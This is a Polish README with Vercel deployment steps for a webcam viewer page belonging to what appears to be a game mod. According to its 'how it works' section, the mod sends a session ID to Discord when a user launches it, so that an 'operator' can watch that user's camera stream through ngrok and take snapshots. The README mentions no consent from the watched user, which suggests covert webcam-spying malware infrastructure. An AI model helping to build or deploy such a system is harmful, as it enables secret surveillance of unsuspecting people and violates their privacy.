# Webcam Stream Viewer - Deploy na Vercel

Ta strona HTML służy do oglądania streamów z kamery użytkowników moda. Wymaga Session ID do autoryzacji.

## Jak zhostować na Vercel

### Metoda 1: Przez Vercel CLI (Szybka)

1. Zainstaluj Vercel CLI:
```bash
npm install -g vercel
```

2. Przejdź do folderu `strona`:
```bash
cd c:\Users\janpa\Desktop\GRABKI\strona
```

3. Zaloguj się do Vercel:
```bash
vercel login
```

4. Deploy:
```bash
vercel --prod
```

5. Skopiuj URL który dostaniesz (np. `https://webcam-viewer.vercel.app`)

### Metoda 2: Przez Vercel Dashboard (Łatwiejsza)

1. Wejdź na https://vercel.com i zaloguj się (możesz użyć GitHub)

2. Kliknij "Add New..." → "Project"

3. Import Git Repository:
   - Jeśli masz to na GitHub: wybierz repozytorium
   - Jeśli nie: użyj Vercel CLI lub drag & drop folder

4. Konfiguracja:
   - Framework Preset: **Other** (to statyczna strona HTML)
   - Root Directory: wskaż folder `strona` lub zostaw `/`
   - Build Command: zostaw puste
   - Output Directory: zostaw puste

5. Kliknij "Deploy"

6. Po deploymencie dostaniesz URL (np. `https://webcam-viewer-xyz.vercel.app`)

### Metoda 3: Drag & Drop (Najprostsza)

1. Wejdź na https://vercel.com/new

2. Przeciągnij folder `strona` bezpośrednio do okna przeglądarki

3. Vercel automatycznie wykryje, że to statyczna strona

4. Kliknij "Deploy"

## Aktualizacja URL w kodzie

Po otrzymaniu URL Vercel, zaktualizuj go w pliku:
`WebcamDiscordNotifier.java`

Zmień linię:
```java
private static final String VERCEL_VIEWER_URL = "https://webcam-viewer.vercel.app";
```

Na swój URL:
```java
private static final String VERCEL_VIEWER_URL = "https://twoja-nazwa.vercel.app";
```

## Jak działa

1. **Użytkownik uruchamia mod** → Generuje się unikalny Session ID
2. **Mod wysyła na Discord** → Wiadomość zawiera Session ID i link do strony
3. **Operator klika link** → Otwiera stronę Vercel z pre-wypełnionym Session ID
4. **Strona prosi o ngrok URL** → Operator wpisuje URL (lub będzie w Discord)
5. **Stream się łączy** → Operator widzi obraz z kamery użytkownika

## Struktura plików

```
strona/
├── index.html       # Główna strona viewer
├── vercel.json     # Konfiguracja Vercel
└── README.md       # Ten plik
```

## Features strony

- ✅ Walidacja Session ID (UUID v4)
- ✅ Auto-connect z URL parameter (?session_id=...)
- ✅ Real-time MJPEG stream
- ✅ Robienie snapshotów (PNG)
- ✅ Auto-reconnect przy utracie połączenia
- ✅ Status połączenia (Connected/Reconnecting/Disconnected)
- ✅ Responsywny design (działa na mobile)
- ✅ Wykrywanie nieaktywności użytkownika

## Custom Domain (Opcjonalne)

Możesz dodać własną domenę w Vercel Dashboard:
1. Settings → Domains
2. Dodaj swoją domenę (np. `viewer.twojadomena.com`)
3. Skonfiguruj DNS zgodnie z instrukcjami Vercel
